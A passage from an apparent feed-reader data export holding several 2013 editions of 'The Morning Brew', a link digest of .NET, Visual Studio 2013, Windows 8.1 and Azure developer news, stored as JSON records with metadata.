\"Best Practices for Virtualizing and Managing SQL Server 2012\"</a> - Greg Duncan highlights a new whitepaper discussing the best practices for running SQL Server 2012 in virtual environments, something which is ever more important as infrastructure teams continue adopting virtualisation.</li><li><a href=\"http://blogs.msdn.com/b/jgalasyn/archive/2013/07/08/api-diff-report-for-windows-8-and-windows-8-1-preview.aspx\">API diff report for Windows 8 and Windows 8.1 Preview</a> - Jim Galasyn highlights some work by Koen Zwikstra at First Floor Software who has looked at the differences between the APIs exposed in Windows 8.1 compared to those in Windows 8.</li><li><a href=\"http://www.deanhume.com/Home/BlogPost/web-page-performance---profiling-paint-times/91\">Web Page Performance - Profiling paint times</a> - Dean Hume discusses the performance of web pages, specifically looking at the support in Chrome ‘Canary’ to help identiy the paint time of the page.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/08/looking-backndash-my-first-c-program.aspx\">Looking Back: My First C# Program</a> - K Scott Allen takes us on a trip down memory lane, sharing one of his oldest .NET programs, from the early .NET 1.0 beta days</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/NGCpZ0i73Lw\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1073}}
{"k":"0000000084","o":"0000003738","v":"001"}
{"_id":1074,"_uid":1074,"_dt":1373742618315,"_s":"9ebd2f64393a3f320c817c88d1ddbf87"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/izegHQNYaY4/","title":"The Morning Brew #1393","published":{"$wrap":"$date","v":1373272080000,"h":"2013-07-08T08:28:00.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/07/05/the-answer-to-the-string-concatenation-puzzle/\">The answer to the string concatenation puzzle</a> - Eric Lippert shares the less than obvious answers to last weeks string concatenation puzzle, looking at several cases where ‘addition’ of strings produces results you might not expect</li><li><a href=\"http://paulstovell.com/blog/two-week-sprints-twelve-month-releases\">Two week sprints; twelve month releases</a> - Paul Stovell discusses the importance of actually releasing software to end users as a part of an agile software development process, and the important role of taking that user feedback to improve the product.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/07/05/introducing-select-and-expand-support-in-web-api-odata.aspx\">Introducing $select and $expand support in Web API OData</a> - Javier Calvarro Nelson discusses the inclusion of $select and $exapnd support in the latest version of Web API’s OData implementation, looking at their purpose, use and implementation.</li><li><a href=\"http://madskristensen.net/post/Web-Essentials-2013-Where-is-the-TypeScript-support.aspx\">Web Essentials 2013: Where is the TypeScript support?</a> - Mads Kristensen discusses the removal of TypeScript support (amongst other features removed) when Web Essentials was ported to Visual Studio 2013, discussing how removal now paves the way for core Visual Studio support to be added without conflicts.</li><li><a href=\"http://mtaulty.com/CommunityServer/blogs/mike_taultys_blog/archive/2013/07/05/azure-mobile-services-update-custom-apis.aspx\">Azure Mobile Services Update - Custom APIs</a> - Mike Taulty takes a look at the support for adding custom APIs to Windows Azure Mobile Services via code in Node.js (with .NET support coming soon), walking through a sample implementation.</li><li><a href=\"http://gunnarpeipman.com/2013/07/what-is-claims-based-authentication/\">What is claims-based authentication?</a> - Gunnar Peipman prepares the ground for a number of future posts with an explanation of the key concepts of Claims Based Authentication</li><li><a href=\"http://blogs.msdn.com/b/robch/archive/2013/07/05/wp8-speech-exploring-the-mvvm-pattern.aspx\">WP8 Speech - Exploring the MVVM pattern</a> - Rob Chambers discusses his experiences implementing a Windows Phone 8 application using the MVVM, sharing parts of the code for the application and discussing the implementation of a number of features</li><li><a href=\"http://www.codeproject.com/Articles/617043/Hack-Proof-Your-ASP-NET-Application-From-Cross-Sit\">Hack Proof Your ASP.NET Application From Cross Site Scripting (XSS)</a> - Sarvesh Kushwaha shares a useful reminder of the different classes of Cross Site Scripting attack possible in web applications, and explores how to protect your applications for exploit</li><li><a href=\"http://codebetter.com/johnvpetersen/2013/07/05/a-simple-jquery-qunit-based-javascript-unit-test-project-template/\">A simple jQuery Qunit-based JavaScript Unit Test Project Template </a> - John V Petersen takes a look at testing JavaScript with QUnit based tests using the Chutzpah JavaScript Unit Test Runner and sharing a project template to make it easier to get started writing tests.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/izegHQNYaY4\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1074}}
{"k":"0000000084","o":"0000002962","v":"001"}
{"_id":1075,"_uid":1075,"_dt":1373742619051,"_s":"e4ed8cf415237ea1de15fc8002fa09ee"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/kWgWfHYDOZw/","title":"The Morning Brew #1391","published":{"$wrap":"$date","v":1372927068000,"h":"2013-07-04T08:37:48.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/07/02/visual-studio-performance-providing-feedback.aspx\">Visual Studio Performance - Providing Feedback</a> - Nathan Halstead discusses the importance of those of you who are trying out the Visual Studio 2013 Preview release to give the team feedback, and particularly give them feedback on the performance of the IDE</li><li><a href=\"http://blogs.windows.com/windows_phone/b/wpdev/archive/2013/07/02/running-the-windows-phone-emulator-on-windows-8-1-preview.aspx\">Running the Windows Phone Emulator on Windows 8.1 Preview</a> - Cliff Simpkins shares important news about running the Windows Phone 8 emulator on Windows 8.1 Preview, highlighting the requirement for Update 3 for Visual Studio 2012 to avoid issues.</li><li><a href=\"http://pragprog.com/news/pragpub-magazine-for-july-new-studio-courses\">PragPub Magazine for July, new Studio Courses</a> - The Pragmatic Bookshelf announce the availability of PragPub magazines July Edition with insights on developing your career as a developer, the story of GitHub along with articles on Elixir, Closure and C++</li><li><a href=\"http://www.nczonline.net/blog/2013/07/02/internet-explorer-11-dont-call-me-ie/\">Internet Explorer 11: \"Don’t call me IE\"</a> - Nicholas C. Zakas takes a look at Internet Explorer 11, disecting the User Agent string for Internet Explorer 11, discussing the changes, and looks at some of the changes to the JavaScript  object model</li><li><a href=\"http://www.codeproject.com/Tips/615433/WPF-Objects-Model-Poster\">WPF Objects Model Poster - CodeProject</a> - ntg123 shares a computer created poster of the the ‘Whole Picture’ of the WPF types and their relations over on CodeProject</li><li><a href=\"http://geekswithblogs.net/anirugu/archive/2013/07/03/mozilla-firefox-23-will-block-mixed-ssl-content.aspx\">Mozilla Firefox 23 Will Block Mixed SSL Content</a> - Anirudha gupta shares the news that the next release of FireFox will block content served up over HTTP when the page is HTTPS, something important to be aware of, meaning that now is the time to go fix any such issues in your sites</li><li><a href=\"http://mtaulty.com/CommunityServer/blogs/mike_taultys_blog/archive/2013/07/03/await-task-task-wait-and-friends.aspx\">await Task, Task.Wait and Friends</a> - Mike Taulty sets about de-mystifying Task and Await, looking at which you probably want to use and when, illustrating simple code with examples to aid comprehension</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/kWgWfHYDOZw\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1075}}
{"k":"0000000084","o":"0000004178","v":"001"}
{"_id":1076,"_uid":1076,"_dt":1373742619052,"_s":"44313ea653a211af0df721cddb4c583e"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/oegTGIcNaC8/","title":"The Morning Brew #1390","published":{"$wrap":"$date","v":1372840626000,"h":"2013-07-03T08:37:06.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://www.hanselman.com/blog/OneOfMicrosoftsBestKeptSecretsPythonToolsForVisualStudioPTVS.aspx\">One of Microsoft’s Best-Kept Secrets - Python Tools for Visual Studio (PTVS)</a> - Scott Hanselman highlights the oft forgotten (by MS developers) language Python and the rather excellent Python Tools For Visual Studio which gives a nice IDE experience for developing Python.</li><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/07/code-completion-improvements-in-resharper-8/\">Code Completion Improvements in ReSharper 8</a> - Dmitri Nesteruk shares more details of the Code Completion features of ReSharper 8, showing how the different improvements to code completion behave in use</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/kristol/archive/2013/07/02/the-git-command-line-101-for-windows-users.aspx\">The Git Command Line 101 for Windows Users</a> -  Kristofer Liljeblad  shares a really nice introductory guide to the use of Git on Windows, looking at getting it installed (using the very cool Chocolatey), and explores some of the common queries and questions of its use.</li><li><a href=\"http://www.codeproject.com/Articles/614507/Modular-Javascript-Using-Require-Js\">Modular Javascript Using Require.Js</a> - Sacha Barber takes a look at the use of Require.js to create modular JavaScript code, looking at the motivation for the use of Require and exploring its use via an example in this CodeProject article</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/07/02/visual-studio-2013-heap-view.aspx\">Visual Studio 2013 Heap View</a> - Sasha Goldshtein continues exploring some of the new debugging features of Visual Studio 2013 taking a look at the heap viewer, showing how it can be used to debug memory related issues in your applications.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/07/02/manage-cors-policy-dynamically.aspx\">Manage CORS policy dynamically</a> - Xueyuan Dai takes a look at how you can control the Cross Origin Request Sharing (CORS) policy in your ASP.NET Web API projects with soring the allowed hosts in either a configuration file or database.</li><li><a href=\"http://blogs.msdn.com/b/agile/archive/2013/07/02/windows-azure-autoscaling-now-built-in.aspx\">Windows Azure autoscaling now built-in</a> - Grigori Melnik discusses the new Windows  Azure AutoScaling features released last week, and compares the features of the built in offering to those offered by Wasabi</li><li><a href=\"http://blogs.msdn.com/b/cjacks/archive/2013/07/02/troubleshooting-and-fixing-session-cookie-problems-in-ie11.aspx\">Troubleshooting and Fixing Session Cookie Problems in IE11</a> - Chris Jackson highlights potential problems with Session Cookies in ASP.NET Applications when visited using Internet Explorer 11</li><li><a href=\"http://www.codeproject.com/Articles/614769/Rock-Solid-Quality\">Rock Solid Quality</a> - Paulo Zemek shares thoughts on creating quality in your code by having components be ‘Rock Solid Quality’, bu adopting encapsulation, immutability and a number of other approaches to help eradicate the places where bugs lurk.</li></ul><h3>Community</h3><ul><li><a href=\"https://www.simple-talk.com/blogs/2013/07/02/25-secrets-for-faster-asp-net-the-eagle-has-landed/\">25 Secrets for Faster ASP.NET: the Eagle has landed!<br /></a> - Michaela Murray highlights the availability of the latest e-Book from Red Gate containing 25 community sourced tips and tricks for faster ASP.NET Applications.  The e-book is a free download (though you will have to give your email) and is well worth checking out.  Michaela also announces the winner of the competition for best tip in this post.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/oegTGIcNaC8\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1076}}
{"k":"0000000084","o":"0000006222","v":"001"}
{"_id":1077,"_uid":1077,"_dt":1373742619052,"_s":"3406dc5cb94be3515f61a1ba8c0467ec"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/VTUPKFRgQ9I/","title":"The Morning Brew #1388","published":{"$wrap":"$date","v":1372668223000,"h":"2013-07-01T08:43:43.000Z"},"starred":false,"read":false,"content":"<p>Had a fantastic weekend at DDD East Anglia, enjoyed some excellent sessions, and got to trade war stories with friends old and new.  Many thanks to the organisers for the excellent job they did.</p><h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/typescript/archive/2013/06/28/announcing-typescript-0-9-0-1.aspx\">Announcing TypeScript 0.9.0.1</a> - The TypeScript Team follow on from their 0;9 release with a small update which addresses the highest priority user reported issues with 0.9</li><li><a href=\"http://blogs.msdn.com/b/astoriateam/archive/2013/06/28/wcf-data-services-5-6-0-alpha.aspx\">WCF Data Services 5.6.0 Alpha</a> - The WCF Data Services Team announce the release of an Alpha of the WCF Data Services 5.6, an early (and not yet feature complete) look at some of the new features including Visual Studio 2013 Support, complete Portable Class Library support for client libraries, and serverside inclusion of the URI Parser.</li><li><a href=\"http://blogs.msdn.com/b/nikolait/archive/2013/06/28/touchdevelop-v3-0-for-windows-phone-8-unified-experience-new-language-features-nfc-speech-tiles.aspx\">Announcing TouchDevelop v3.0 for Windows Phone 8: unified experience, new language features, NFC, speech and tile APIs</a> - Nikolai Tillmann announces the 3.0 release of Touch Develop for Windows Phone 8, a major update which brings feature parity with the Wweb application, and also includes Near Field Communication (NFC) support, Speech API access and improved tile features.</li><li><a href=\"http://ayende.com/blog/162658/ravendb-2-5-what-is-new-here?key=b489839b-3782-4dc9-88af-cb3608f2db65\">RavenDB 2.5: What is new here?</a> - Ayende shares the list of new features whcih are being included in RavenDB 2.5 , and links to the details of them </li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/google-net-api-go-portable-v140-google.html\">Google .Net API’s go portable… The v1.4.0 Google APIs .NET library is now a Portable Class Library (PCL) And now uses TPL and the new HttpClient lib too</a> - Greg Duncan highlights the latest update to the Google .NET Client libraries which bring with them support for their use as Portable Class Libraries, and making use of the Task Parallel Library  and new HTTP Client implementations,</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/eric_brechner/archive/2013/07/01/to-be-precise.aspx\">To be precise</a> - ‘I. M. Wright’ discusses the expectations of accuracy in estimation and delivery of software projects, and compares this to the accuracy achieved by landing a space probe on another planet, showing how the two do actually share a lot in common, but not immediate precision, just iteration and course correction.</li><li><a href=\"http://geekswithblogs.net/GruffCode/archive/2013/06/30/making-a-case-for-the-command-line.aspx\">Making a Case For The Command Line</a> - Jesse Taber discusses the importance of internal tools with applications, and discusses the idea of starting simple, and building a command line tool before moving on to creating web interfaces for the tool.</li><li><a href=\"http://www.strathweb.com/2013/06/ihttpactionresult-new-way-of-creating-responses-in-asp-net-web-api-2/\">IHttpActionResult - new way of creating responses in ASP.NET Web API 2</a> - Filip W takes a look at the newly introduced IHttpActionResult included in ASP.NET Web API 2, providing a new and easy way to return a response from an API action</li><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/300-for-320-320-windows-81-app-and-code.html\">300 for 320 - 320 Windows 8.1. app and code samples, C++, C#, JavaScript, in a 300MB download… (Or get language level download or pick and choose singles)</a> - Greg Duncan highlights the huge number of samples for Windows 8(.1) development available in the 300MB samples pack</li><li><a href=\"http://www.codeproject.com/Tips/613712/LINQ-to-ASCII-Art\">LINQ to ASCII Art</a> - Hisham Abdullah Bin Ateya takes a look at converting images using LINQ, exploring the conversion to text and the wonders of ASCII Art.</li></ul><h3>Community</h3><ul><li><a href=\"http://lostechies.com/jimmybogard/2013/06/28/ndc-videos-online/\">NDC Videos online</a> - Jimmy Bogard highlights the availability of his sessions from the recent NDC conference.  All the sessions from the conference are now available online on Vimeo on the <a href=\"http://vimeo.com/ndcoslo\">NDCOslo on Vimeo</a> account,  so check them out as there is an incredible amount of good technical content there.</li><li><a href=\"http://blogs.msdn.com/b/lucian/archive/2013/06/28/talk-the-complete-async-three-talks-from-teched-europe-2013.aspx\">Talk: The Complete Async — three talks from TechEd Europe 2013</a> - Lucian Wischik shares Video, Slides, demo code and speaker notes for his three sessions on Async presented at the TechEd Europe conference last week.  The content here takes you from beginner level through to advanced topics.</li><li><a href=\"http://www.udidahan.com/2013/06/28/ask-udi-1-alternative-architectures-preaching-to-the-unconverted/\">Ask Udi 1: Alternative Architectures - Preaching to the Unconverted</a> - Udi Dahan shares the first episode of his Ask Udi series addressing the top two questions he received, discussing standard architecture, and the motivations that can be used on those less inclined towards publish subscribe and message bus architectures.</li><li><a href=\"http://blog.getglimpse.com/2013/06/30/glimpse-town-hall-3/\">Glimpse Town Hall #3 </a> - The Glimpse Team are holding their next ‘Town Hall’ meeting on Tuesday, July 2nd at 4:00 PM (UTC-5:00).  This is an opportunity to discuss a variety of aspects of the project including project roadmap and questions and answers</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/VTUPKFRgQ9I\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1077}}
{"k":"0000000084","o":"0000008164","v":"001"}
{"_id":1078,"_uid":1078,"_dt":1373742620867,"_s":"d66426c6ccc559cfa7a07626e7def12d"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/W8vy9862FJU/","title":"The Morning Brew #1387","published":{"$wrap":"$date","v":1372407061000,"h":"2013-06-28T08:11:01.000Z"},"starred":false,"read":false,"content":"<p>Another big edition today, still lots of //build/ and Visual Studio 2013 news about.</p><p>Two other snippets of news:</p><ul><li>Tomorrow is <a href=\"http://www.dddeastanglia.com/\">DDD East Anglia</a> down in Cambridge - I’ll be there, and I suspect so will some of you, so if you see me come and say Hi.</li><li>Prompted by a request from a reader for Twitter announcements of posts I’ve set up a new Twitter account (<a href=\"http://twitter.com/MorningBrewNet\">@MorningBrewNet</a>) which hopefully starting from today’s edition will include a tweet announcing the post shortly after it goes live.</li></ul><h3>//build/ and Visual Studio 2013</h3><ul><li><a href=\"http://blogs.msdn.com/b/fsharpteam/archive/2013/06/27/announcing-a-pre-release-of-f-3-1-and-the-visual-f-tools-in-visual-studio-2013.aspx\">Announcing a pre-release of F# 3.1 and the Visual F# tools in Visual Studio 2013</a> - The F# Team announce the release of the preview release of F# 3.1 and the Visual F# Tools included as a part of the Visual Studio 2013 Preview Release.  This release aims to improve the software engineering aspects of the language, and to make it easier to use in common situations, with improvements to array slicing, LINQ type inference, C# Extension methods and support for .NET 4.5 and Windows Store portable libraries.  The tooling also gets a number of improvements</li><li><a href=\"http://blogs.msdn.com/b/adonet/archive/2013/06/26/ef-and-visual-studio-2013-preview.aspx\">EF and Visual Studio 2013 Preview</a> - Rowan Miller highlights the inclusion of Entity Framework 6 Beta 1 in the Visual Studio 2013 Preview Release, sharing a summary of the changes and improvements made as a part of the EF6 release.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/27/html-editing-features-in-visual-studio-2013-preview.aspx\">HTML Editing Features in Visual Studio 2013 Preview</a> - VKichline shares details of the improvements made by way of a completely new implementation of the HTML Editor in Visual Studio 2013 Preview.  This new editor applies to both Razor and HTML editing, and aims to make extensibility easier, allowing new features to be added in update packages.  The post also notes some of the areas which have yet to be completed, and didn’t make it into the preview release.</li><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/06/27/what-s-new-in-visual-studio-2013-preview-for-authoring-windows-store-xaml-apps.aspx\">What’s new in Visual Studio 2013 Preview for authoring Windows Store XAML apps</a> - The Visual Studio team highlight the improvements in the Preview Release, and the edition of Blend which ships with it which improve the experience working with XAML for creating Windows Store applications, including improved navigation via Go To Definition, substantial performance improvements, improved style and template editing and much more.</li><li><a href=\"http://blogs.msdn.com/b/lightswitch/archive/2013/06/27/announcing-lightswitch-in-visual-studio-2013-preview.aspx\">Announcing LightSwitch in Visual Studio 2013 Preview</a> - The Visual Studio LightSwitch team highlight their inclusion in the Visual Studio 2013 Preview Release, sharing details of their significant new features in the areas of project navigation and team collaboration.</li><li><a href=\"http://weblogs.asp.net/scottgu/archive/2013/06/27/windows-azure-general-availability-release-of-web-sites-mobile-services-new-autoscale-alerts-support-no-credit-card-needed-for-msdn-subscribers.aspx\">Windows Azure: General Availability of Web Sites + Mobile Services, New AutoScale + Alerts Support, No Credit Card Needed for MSDN</a> & <a href=\"http://blogs.msdn.com/b/windowsazure/archive/2013/06/27/announcing-the-general-availability-of-windows-azure-mobile-services-web-sites-and-continued-service-innovation.aspx\">Announcing the General Availability of Windows Azure Mobile Services, Web Sites and continued Service innovation</a> - Scott Guthrie and the official Azure Blog share in a number of announcements, including the General Availability of Azure Websites and Mobile Serivces with SLA, new Auto Scaling features which allows Azure to monitor key metrics (initially CPU and Storage Queue Depth) and apply more or less resources as required, new monitoring metrics and the ability to get alerts by email, and finally no requirement for a credit card to enable the MSDN Azure benefits.</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/27/what-s-new-for-visual-c-developers-in-vs2013-preview.aspx\">What’s New for Visual C++ Developers in VS2013 Preview</a> - Eric Battalio pulls together the details of all the new features for C++ Developers which are included in the preview release of Visual Studio 2013</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/27/using-the-2013-cpu-sampling-profiler-to-understand-c-compiler-optimizations.aspx\">Using the 2013 CPU Sampling Profiler to Understand C++ Compiler Optimizations</a> - Andrew B Hall takes a look at the improved profiling capabilities for C++ applications in Visual Studio 2013 Preview, and looks at how compiler optimisations can influence what you see in the profiler.</li></ul><h3>Software</h3><ul><li><a href=\"http://blogs.jetbrains.com/dotnet/2013/06/resharper-80-beta-is-available/\">ReSharper 8.0 Beta is Available</a> & <a href=\"http://blogs.jetbrains.com/dotnet/2013/06/resharper-to-support-c/\">ReSharper to Support C++</a> - The JetBrains team announce the availability of the Beta of ReSharper 8, a release which already works correctly in the newly release preview of Visual Studio 2013.  The team also announce their plans to implement ReSharper for C++ developers in future releases of ReSharper, and discussing their progress to date on implementing this.</li></ul><h3>Information</h3><ul><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/06/27/ie11-preview-and-the-new-developer-tools.aspx\">IE11 Preview and the New Developer Tools</a> - K. Scott Allen takes a look at the new Internet Explorer 11 F12 Developer Tools which have been vastly overhauled in the new release, and take on a ‘Metro’ look and feel.</li><li><a href=\"http://blogs.msdn.com/b/pakistan/archive/2013/06/27/new-controls-in-windows-8-1.aspx\">New Controls in Windows 8.1</a> - Muhamad Umer highlights the new controls available to developers in Windows 8.1 Applications in the preview release</li><li><a href=\"http://visualstudiomagazine.com/articles/2013/06/26/signalr-revisisted.aspx\">SignalR Revisited</a> - Eric Vogel takes a look at the recent changes  SignalR building on his previous articles on the subject, looking at implementing his previous example application using persistent connections using the latest version of the API to illustrate the differences.</li><li><a href=\"http://gunnarpeipman.com/2013/06/new-way-of-creating-web-applications-on-visual-studio-2013/\">New way of creating web applications on Visual Studio 2013</a> - &</li><li><a href=\"http://gunnarpeipman.com/2013/06/code-information-indicators-in-visual-studio-2013/\">Code Information Indicators in Visual Studio 2013</a> - Gunnar Peipman explores the new Visual Studio Preview with a look at the new Web Project setup dialogs allowing a better choice of what aspects of the ‘One ASP.NET’ framework your project contains, and takes a look at some of the new visual aids to inform you about different aspects of your code.</li><li><a href=\"http://www.codetails.com/slolam/automate-orchestrate-azure-deployment/20130625\">Automate & Orchestrate Azure</a> - Shailesh Lolam takes a look at automating and coordinating the process of deploying to and provisioning Windows Azure services</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/W8vy9862FJU\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1078}}
{"k":"0000000084","o":"0000012741","v":"001"}
{"_id":1079,"_uid":1079,"_dt":1373742620868,"_s":"b69d4c32d7779f12fc7957193fa31749"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/-HQNJ9eaYDk/","title":"The Morning Brew #1386","published":{"$wrap":"$date","v":1372324939000,"h":"2013-06-27T09:22:19.000Z"},"starred":false,"read":false,"content":"<p>Today’s edition is a bit of a beast, with lots of interesting stuff coming from the opening day of  //build.</p><p>In other news, lots of you read The Morning Brew using Google Reader (and associated 3rd Party apps).  As many of you will know, Google Reader <a href=\"https://support.google.com/reader/answer/3028851\">is being shutdown on 1st July</a> so I wanted to take a moment to make sure that you are able to take The Morning Brew with you after the shutdown.  </p><p>There are plenty of options for replacements of Google Reader itself, with a nice comprehensive list at <a href=\"http://www.replacereader.com/\">ReplaceReader.com</a> - I personally have moved over to <a href=\"http://feedly.com\">Feedly</a> in the last few days.</p><p>As for keeping The Morning Brew in your reader, many of the services will extract your existing Google Reader subscriptions (assuming you migrate before it shuts down), but should you need it here are the options for getting The Morning Brew:</p><ul><li> RSS: <a href=\"http://feeds.feedburner.com/ReflectivePerspective\">http://feeds.feedburner.com/ReflectivePerspective</a></li><li>Email Subscription: <a href=\"http://feedburner.google.com/fb/a/mailverify?uri=ReflectivePerspective\">Via FeedBurner Subscriptions</a></li><li>Web: <a href=\"http://theMorningBrew.Net\">http://TheMorningBrew.NET/</a></ul><p>Service announcement over, now onto the links…</p><h3>Visual Studio 2012 Update 3, Visual Studio 2013 Preview, and .NET 4.5.1</h3><ul><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/26/announcing-the-net-framework-4-5-1-preview.aspx\">Announcing the .NET Framework 4.5.1 Preview</a> - The .NET Team announce the release of the .NET Framework 4.5.1 Preview release.  This is the next step in the frameworks evolution, and despite the 0.0.1 version number increase there is plenty of good stuff in there including edit and continue support for x64, improved debugging capabilities, improved ADO.Net connection resilience, further capabilities for Windows 8 Store application development, JIT and Garbage collection improvements, and an increasing use of NuGet to help modularise the framework.</li><li><a href=\"http://blogs.msdn.com/b/mariohewardt/archive/2013/06/26/no-more-memory-fragmentation-on-the-large-object-heap.aspx\">No More Memory Fragmentation on the .NET Large Object Heap</a> - Mario Hewardt highlights the improvements to the .NET Large Object Heap in .NET 4.5.1 which should significantly reduce the risk of memory fragmentation</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/visual-studio-2012-3-is-released.aspx\">Visual Studio 2012.3 is released</a> - Brian Harry announces the RTM release of Visual Studio 2012 Update 3 (also known as 2012.3).  This is an RTM release, and can be used in production now, and includes bugfixes and a few features for Visual Studio and Team Foundation Server, as well as improving compatibility with Visual Studio 2013.</li><li><a href=\"http://www.kunal-chowdhury.com/2013/06/download-vs2012-update-3-rtm.html\">Visual Studio 2012 Update 3 (RTM) now available for download</a> - Kunal Chowdhury also highlights the Visual Studio 2012.3 Update RTM, sharing links to the download for the update, and also the original product links.</li><li><a href=\"http://blogs.msdn.com/b/somasegar/archive/2013/06/26/visual-studio-2013-preview.aspx\">Build 2013 and Visual Studio 2013 Preview</a> - Somasegar announces the Preview Release of Visual Studio 2013, and the .NET Framework 4.5.1, and also the Visual Studio 2012.3 Update RTM.  This post gives a nice overview of the new features across the stack, and includes links off to more information from the specialist teams on a number of the items.</li><li><a href=\"http://blogs.msdn.com/b/visualstudio/archive/2013/06/26/visual-studio-2013-preview-available-now.aspx\">Visual Studio 2013 Preview Available Now!</a> - The Visual Studio Blog also announces the release, and provides links to the various ways you can give feedback about the new release.</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/visual-studio-2013-preview-is-available.aspx\">Visual Studio 2013 Preview is available</a> & <a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/26/a-few-more-visual-studio-2013-preview-features.aspx\">A few more Visual Studio 2013 Preview features</a> - Brian Harry highlights the Visual Studio 2013 Preview release, and takes a look at a couple of the new features, including cloud testing support and the ‘Connected IDE’  feature which allows your settings to roam with you.</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/26/visual-studio-2013-preview-version-control-tfbuild.aspx\">Visual Studio 2013 Preview: Version control and Team Foundation Build</a> - Andy Lewis takes a look at the new features around Version Control and Team Foundation Build included in the Visual Studio 2013 Preview release, and shares some workarounds for known issues in the preview release.</li><li><a href=\"http://blogs.msdn.com/b/visualstudioalm/archive/2013/06/26/debugging-support-for-64-bit-edit-and-continue-in-visual-studio-2013.aspx\">Debugging support for 64-bit Edit and Continue in Visual Studio 2013</a> - YanivF highlights the new Edit and Continue support for 64 bit targeted environments, a new feature in VS2013 which will take away that very annoying message which appears whenever you are at a break point and want to edit code when running in 64 bit.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/26/announcing-release-of-asp-net-and-web-tools-for-visual-studio-2013-preview-and-the-refresh-update.aspx\">Announcing release of ASP.NET and Web Tools for Visual Studio 2013 Preview and the refresh update </a> - Xinyang Qiu shares a look at the new ASP.NET features included in the Visual Studio 2013 Preview, including SignalR connections between browser and IDE for debugging assistance, a new HTML Editor, improvements for the ‘One ASP.NET’ initiative making it much easier to product hybrid solutions using a mix of ASP.NET technologies, improvements for running ontop of OWIN especially for Authenitication, ASP.NET MVC 5 and Web API 2, along with SignalR 2.00-beta1 and Entity Framework 6 Beta1</li><li><a href=\"http://blogs.msdn.com/b/robertgreen/archive/2013/06/26/episode-70-of-visual-studio-toolbox-visual-studio-2013-preview.aspx\">Episode 70 of Visual Studio Toolbox: Visual Studio 2013 Preview</a> - Robert Green highlights the 70th edition of the Visual Studio Toolbox on Channel9 where he is joined by Dmitry Lyalin, and they take a 1 hour whirlwind tour of Visual Studio 2013.</li></ul><h3> Windows 8.1 Update, and other  //build related announcements</h3><ul><li><a href=\"http://windows.microsoft.com/en-gb/windows-8/preview?ocid=blprev_pr_wom\">Windows 8.1 Preview - Microsoft Windows</a> - The Windows 8.1 Preview release has been made available, and includes a number of great enhancements including the return of the start button, login to desktop, the inclusion of Outlook RT (for Surface RT users), and a whole host of other improvements.</li><li><a href=\"http://www.hanselman.com/blog/10NewFeaturesInWindows81PreviewThatSavedMySurfaceRT.aspx\">10 New Features in Windows 8.1 Preview that saved my Surface RT</a> - Scott Hanselman takes a look at his top 10 new features included in the Windows 8.1 Update</li><li><a href=\"http://blogs.msdn.com/b/robmar/archive/2013/06/26/windows-8-1-preview-frequently-asked-questions-faq.aspx\">Windows 8.1 Preview : Frequently Asked Questions (FAQ)</a> - Rob Margel highlights the offical Windows 8.1 FAQ which provides answers to the most common questions about the use of the Preview release.</li><li><a href=\"http://blogs.msdn.com/b/ie/archive/2013/06/26/introducing-ie11-the-best-way-to-experience-the-web-on-modern-touch-devices.aspx\">Introducing IE11: The Best Way to Experience the Web on Modern Touch Devices</a> - The Internet Explorer Team announce the release of Internet Explorer 11 Preview  included as a part of the Windows 8.1 Update Preview release.  This release includes numerous performance improvements, and significantly a completely new set of F12 Developer Tools</li><li><a 